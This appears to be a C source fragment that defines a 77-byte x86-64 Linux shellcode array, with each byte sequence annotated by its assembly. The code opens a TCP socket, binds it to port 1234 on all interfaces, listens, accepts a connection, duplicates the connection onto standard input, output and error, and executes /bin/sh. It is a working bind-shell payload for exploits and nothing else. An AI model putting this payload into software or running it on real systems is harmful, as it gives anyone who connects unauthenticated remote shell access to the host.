
#define BS_SIZE 77

char BS[] = {
  /* 0000 */ "\x6a\x29"                                 /* push 0x29                   */
  /* 0002 */ "\x58"                                     /* pop rax                     */
  /* 0003 */ "\x6a\x01"                                 /* push 0x1                    */
  /* 0005 */ "\x5e"                                     /* pop rsi                     */
  /* 0006 */ "\x6a\x02"                                 /* push 0x2                    */
  /* 0008 */ "\x5f"                                     /* pop rdi                     */
  /* 0009 */ "\x99"                                     /* cdq                         */
  /* 000A */ "\x0f\x05"                                 /* syscall                     */
  /* 000C */ "\x97"                                     /* xchg edi, eax               */
  /* 000D */ "\x48\xb8\xfd\xff\xfb\x2d\xff\xff\xff\xff" /* mov rax, 0xffffffff2dfbfffd */
  /* 0017 */ "\x48\xf7\xd0"                             /* not rax                     */
  /* 001A */ "\x50"                                     /* push rax                    */
  /* 001B */ "\x54"                                     /* push rsp                    */
  /* 001C */ "\x5e"                                     /* pop rsi                     */
  /* 001D */ "\xb2\x10"                                 /* mov dl, 0x10                */
  /* 001F */ "\xb0\x31"                                 /* mov al, 0x31                */
  /* 0021 */ "\x0f\x05"                                 /* syscall                     */
  /* 0023 */ "\x31\xf6"                                 /* xor esi, esi                */
  /* 0025 */ "\xb0\x32"                                 /* mov al, 0x32                */
  /* 0027 */ "\x0f\x05"                                 /* syscall                     */
  /* 0029 */ "\xb0\x2b"                                 /* mov al, 0x2b                */
  /* 002B */ "\x0f\x05"                                 /* syscall                     */
  /* 002D */ "\x97"                                     /* xchg edi, eax               */
  /* 002E */ "\x96"                                     /* xchg esi, eax               */
  /* 002F */ "\xb0\x21"                                 /* mov al, 0x21                */
  /* 0031 */ "\x0f\x05"                                 /* syscall                     */
  /* 0033 */ "\x83\xee\x01"                             /* sub esi, 0x1                */
  /* 0036 */ "\x79\xf7"                                 /* jns 0x2f                    */
  /* 0038 */ "\x31\xf6"                                 /* xor esi, esi                */
  /* 003A */ "\x52"                                     /* push rdx                    */
  /* 003B */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
  /* 0045 */ "\x51"                                     /* push rcx                    */
  /* 0046 */ "\x54"                                     /* push rsp                    */
  /* 0047 */ "\x5f"                                     /* pop rdi                     */
  /* 0048 */ "\x99"                                     /* cdq                         */
  /* 0049 */ "\xb0\x3b"                                 /* mov al, 0x3b                */
  /* 004B */ "\x0f\x05"                                 /* syscall                     */
};